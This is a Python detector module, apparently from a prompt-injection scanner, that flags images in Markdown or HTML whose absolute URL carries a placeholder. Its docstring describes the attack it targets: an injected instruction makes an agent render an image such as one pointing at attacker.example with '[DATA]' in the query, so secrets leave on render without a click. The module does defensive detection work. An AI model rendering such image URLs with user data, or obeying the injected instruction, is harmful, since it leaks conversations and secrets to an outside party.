"""Images whose URL carries a template placeholder: the exfiltration end of an injection.

An injected instruction asks the agent to render an image such as
``![x](https://attacker.example/l.png?q=[DATA])`` with the conversation or a secret in place of
the placeholder. The interface fetches an image when the reply renders, so the data leaves
without a click. Only images are read here: a link with ``?api_key={KEY}`` is ordinary API
documentation, and an instruction to put data into a URL is the phrase detector
``exfil-instruction``.

Read: Markdown inline images ``![alt](url)`` (also ``(<url>)``), reference-style images
(``![alt][ref]``, ``![ref][]``, ``![ref]``) through their ``[ref]: url`` definition, and HTML
``<img src=...>``. The URL must be absolute (``http(s)://`` or ``//``). A placeholder is a
brace or double-brace name (``{x}``, ``{{x}}``), an upper-case name in square or angle brackets
(``[DATA]``, ``<SUMMARY>``), a shell variable (``$KEY``, ``${KEY}``), ``%s`` / ``%(x)s``, their
URL-encoded brace and bracket forms, or a query value that is one of a short list of upper-case
data words (``?q=INFO``). Every pattern is linear: no nested quantifiers.
"""
from __future__ import annotations

import re

_PLACEHOLDER = re.compile(
    r"\{\{?[ \t]{0,4}[A-Za-z_][\w.\-]{0,40}[ \t]{0,4}\}\}?"
    r"|\[[A-Z][A-Z0-9_]{1,40}\]"
    r"|<[A-Z][A-Z0-9_]{1,40}>"
    r"|\$\{?[A-Z][A-Z0-9_]{1,40}\b\}?"
    r"|%s(?![0-9A-Fa-f])|%\(\w{1,40}\)s"
    r"|%7[Bb][A-Za-z_][\w.\-]{0,40}%7[Dd]"
    r"|%5[Bb][A-Z][A-Z0-9_]{1,40}%5[Dd]"
    r"|=(?:INFO|DATA|SECRETS?|SUMMARY|TOKEN|KEY|PASSWORD|CONTEXT|HISTORY|CONVERSATION|CHAT"
    r"|MEMORY|PROMPT|MESSAGES?|CREDENTIALS?)(?![\w])")

_ABSOLUTE = re.compile(r"(?:https?:)?//[^\s/]", re.I)

# `![alt](url ...)`: alt text on one line; the URL runs to white space or an unbalanced `)`, or
# is `<...>`. A balanced `(...)` stays in the URL, as in CommonMark, so `%(x)s` is read whole.
_ALT = r"(?:[^\[\]\n]|\[[^\[\]\n]{0,100}\]){0,300}"     # alt text, one level of nested brackets
_INLINE = re.compile(r"!\[" + _ALT + r"\]\([ \t]{0,8}(?:<([^>\n]{1,4000})>|((?:[^\s()]|\([^\s()]{0,100}\)|\((?![^\s()]{0,100}\))){1,4000}))")
# `![alt][ref]`, `![ref][]`, `![ref]` (shortcut): the label the image uses
_REF_USE = re.compile(r"!\[(" + _ALT + r")\](?:\[([^\[\]\n]{0,500})\])?")
_REF_DEF = re.compile(r"^[ ]{0,3}\[([^\]\n]{1,500})\]:[ \t]{0,8}(?:<([^>\n]{1,4000})>(?=\s|$)|(\S{1,4000}))", re.M)
_IMG_SRC = re.compile(
    r"<img\b[^<>]{0,2000}?\bsrc[ \t]{0,8}=[ \t]{0,8}(?:\"([^\"]{0,4000})\"|'([^']{0,4000})'|([^\s>]{1,4000}))",
    re.I)


def _label(s: str) -> str:
    return " ".join(s.split()).casefold()


#: A placeholder in the PATH of an image URL counts only with a data-like name: `{owner}/{repo}`
#: and `{width}x{height}` are ordinary URL templates (badges, resizers); in the query, any counts.
_DATA_NAME = re.compile(r"(?i)data|info|secret|summary|token|key|passw|context|history|conversation|"
                        r"chat|memory|prompt|message|credential|cookie|session|env|email")


def _hit(url: str) -> str | None:
    if not _ABSOLUTE.match(url):
        return None
    q = min([i for i in (url.find("?"), url.find("#")) if i >= 0], default=len(url))
    for m in _PLACEHOLDER.finditer(url):
        if m.start() >= q or _DATA_NAME.search(m.group(0)):
            return m.group(0)
    return None


def find(text: str) -> list[tuple[int, str, str]]:
    """(line, url, placeholder) for every image whose absolute URL carries a placeholder."""
    out: list[tuple[int, str, str]] = []

    def line_of(pos: int) -> int:
        return text.count("\n", 0, pos) + 1

    for m in _INLINE.finditer(text):
        url = m.group(1) or m.group(2)
        ph = _hit(url)
        if ph:
            out.append((line_of(m.start()), url, ph))
    used = set()
    for m in _REF_USE.finditer(text):
        if m.end() < len(text) and text[m.end()] == "(":
            continue                                   # an inline image, read above
        used.add(_label(m.group(2) or m.group(1)))
    if used:
        for m in _REF_DEF.finditer(text):
            if _label(m.group(1)) in used:
                url = m.group(2) or m.group(3)
                ph = _hit(url)
                if ph:
                    out.append((line_of(m.start()), url, ph))
    for m in _IMG_SRC.finditer(text):
        url = m.group(1) or m.group(2) or m.group(3) or ""
        ph = _hit(url)
        if ph:
            out.append((line_of(m.start()), url, ph))
    return out
